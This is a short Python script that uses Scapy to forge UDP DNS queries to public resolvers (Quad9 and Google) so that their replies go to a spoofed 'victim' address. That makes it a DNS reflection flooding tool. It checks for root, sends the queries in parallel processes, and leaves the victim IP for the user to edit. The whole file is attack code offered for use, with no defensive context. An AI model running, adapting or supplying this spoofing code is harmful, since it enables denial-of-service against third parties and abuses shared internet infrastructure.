#!/usr/bin/python3
#Trying non-standard library
try:
    from scapy.all import DNSQR,DNS,UDP,IP,send
    print('[*] Imported non-standard library Scapy')
except:
    print("Scapy library not installed.")
    print('To install: python3 -m pip install scapy')

#importing standard libraries
from multiprocessing import Pool
from time import time
from os import getpid
from subprocess import Popen,PIPE
print('[*] Imported standard libraries multiprocessing,time,os,subprocess')
#Check user. Root required to create sockets
p = Popen('whoami', stdout=PIPE, stderr=PIPE)
o = p.communicate()[0].decode().lstrip().rstrip()
if o != 'root':
  print("[*] Need root access to create sockets.")
  exit()

#define servers and victim
servers = ('9.9.9.9', '8.8.8.8', '8.8.4.4')
victim = ('127.0.0.1') #EDIT

#Function that gets put into multiprocessing
def transform(x):
    print('Started PID {0} for {1}'.format(getpid(), x))
    dns_req = send(IP(src=victim, dst=x)/
    UDP()/
    DNS(rd=1,qd=DNSQR(qname="google.com")), count=5)


#define start time
start = time()
pool = Pool(3)
result = pool.map(transform, servers)
end = time()
#define end time

print(f'\nTime to complete: {end - start:.2f}s\n')

